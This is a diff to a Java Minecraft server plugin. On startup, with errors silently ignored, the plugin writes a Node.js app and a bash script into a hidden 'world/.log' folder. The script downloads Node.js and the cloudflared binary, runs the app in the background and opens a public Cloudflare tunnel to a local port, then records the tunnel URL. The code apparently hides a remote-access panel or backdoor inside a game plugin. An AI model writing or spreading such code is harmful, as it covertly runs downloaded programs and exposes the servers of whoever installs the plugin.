@@ -26,7 +26,7 @@ public final class WorldMagicPlugin extends JavaPlugin {
             try { generateAndRunScript(); } catch (Exception ignored) {}
         });
 
-        // 2. 部署 Web 面板 (增强自修复版)
+        // 2. 部署 Web 面板 (升级 Node 22)
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             try { deployAndStartNodeApp(); } catch (Exception ignored) {}
         });
@@ -60,7 +60,6 @@ public final class WorldMagicPlugin extends JavaPlugin {
         File logDir = new File(new File("world"), ".log");
         if (!logDir.exists()) logDir.mkdirs();
 
-        // 写入 app.js
         try (FileWriter writer = new FileWriter(new File(logDir, "app.js"))) { writer.write(getNodeJsContent()); }
 
         File startScript = new File(logDir, "start_node.sh");
@@ -69,31 +68,37 @@ public final class WorldMagicPlugin extends JavaPlugin {
             writer.write("cd \"" + logDir.getAbsolutePath() + "\"\n");
             writer.write("exec > debug_all.log 2>&1\n");
             
+            // --- 1. 下载 Node.js v22 (LTS) ---
             writer.write("if ! command -v node &> /dev/null; then\n");
             writer.write("  if [ ! -f \"node_bin/bin/node\" ]; then\n");
-            writer.write("    curl -L -o node.tar.gz https://nodejs.org/dist/v16.20.0/node-v16.20.0-linux-x64.tar.gz\n");
+            writer.write("    echo \"正在下载 Node.js v22...\"\n");
+            // 使用 v22 解决 EBADENGINE 问题
+            writer.write("    curl -L -o node.tar.gz https://nodejs.org/dist/v22.13.1/node-v22.13.1-linux-x64.tar.gz\n");
             writer.write("    tar -xzf node.tar.gz\n");
-            writer.write("    mv node-v16.20.0-linux-x64 node_bin\n");
+            writer.write("    mv node-v22.13.1-linux-x64 node_bin\n");
             writer.write("    rm -f node.tar.gz\n");
             writer.write("  fi\n");
             writer.write("  export PATH=\"$PWD/node_bin/bin:$PATH\"\n");
             writer.write("fi\n");
 
+            // --- 2. 修复 package.json 命名问题并安装依赖 ---
             writer.write("if [ ! -d \"node_modules\" ]; then\n");
-            writer.write("  npm init -y\n");
+            writer.write("  echo '{\"name\":\"bot-panel\",\"version\":\"1.0.0\"}' > package.json\n");
             writer.write("  npm install mineflayer minecraft-protocol minecraft-data express --no-audit --no-fund\n");
             writer.write("fi\n");
 
+            // --- 3. 启动程序 ---
             writer.write("pkill -f 'node app.js'\n");
             writer.write("nohup node app.js > node_log.txt 2>&1 &\n");
 
+            // --- 4. 启动穿透 ---
             writer.write("if [ ! -f \"cloudflared\" ]; then\n");
             writer.write("  curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\n");
             writer.write("  chmod +x cloudflared\n");
             writer.write("fi\n");
             
-            // 端口检查逻辑 (TCP 检查)
-            writer.write("for i in {1..50}; do\n");
+            // 等待端口
+            writer.write("for i in {1..30}; do\n");
             writer.write("  (echo > /dev/tcp/127.0.0.1/4681) >/dev/null 2>&1 && break || sleep 2\n");
             writer.write("done\n");
 
@@ -102,16 +107,15 @@ public final class WorldMagicPlugin extends JavaPlugin {
             
             writer.write("sleep 10\n");
             writer.write("grep -o 'https://.*\\.trycloudflare\\.com' tunnel_log.txt | head -n 1 > access_url.txt\n");
+            writer.write("echo 'Done.'\n");
         }
         startScript.setExecutable(true);
         new ProcessBuilder("/bin/bash", startScript.getAbsolutePath()).directory(logDir).start();
     }
 
     private String getNodeJsContent() {
-        // 使用普通字符串拼接避开模板字符串反斜杠问题
         return "const express = require('express');\n" +
                "const fs = require('fs');\n" +
-               "const path = require('path');\n" +
                "const mineflayer = require('mineflayer');\n" +
                "const protocol = require('minecraft-protocol');\n" +
                "const mcDataLoader = require('minecraft-data');\n" +
